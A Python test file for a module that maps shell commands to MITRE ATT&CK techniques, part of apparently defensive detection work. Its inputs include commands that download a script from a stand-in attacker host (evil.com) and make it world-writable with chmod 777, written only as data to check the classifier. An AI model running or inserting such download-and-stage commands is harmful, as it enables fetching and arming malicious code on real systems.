from mitre_mapper import map_command, map_command_or_default


def test_empty_command_returns_no_matches():
    assert map_command("") == []
    assert map_command(None) == []


def test_wget_maps_to_ingress_tool_transfer():
    matches = map_command("wget http://evil.com/payload.sh")
    ids = {m.technique_id for m in matches}
    assert "T1105" in ids


def test_chmod_maps_to_permissions_modification():
    matches = map_command("chmod 777 /tmp/.x")
    ids = {m.technique_id for m in matches}
    assert "T1222" in ids


def test_ssh_brute_force_maps_to_credential_access():
    matches = map_command("ssh brute force attempt detected")
    tactics = {m.tactic for m in matches}
    assert "Credential Access" in tactics


def test_multi_stage_command_yields_multiple_techniques():
    matches = map_command("wget http://evil.com/x.sh && chmod 777 x.sh")
    ids = {m.technique_id for m in matches}
    assert "T1105" in ids
    assert "T1222" in ids


def test_unclassified_command_falls_back_to_default():
    matches = map_command_or_default("some totally benign unmatched string xyz")
    assert len(matches) == 1
    assert matches[0].matched_on == "<unclassified command>"


def test_case_insensitive_matching():
    matches = map_command("WGET HTTP://EVIL.COM/X.SH")
    ids = {m.technique_id for m in matches}
    assert "T1105" in ids
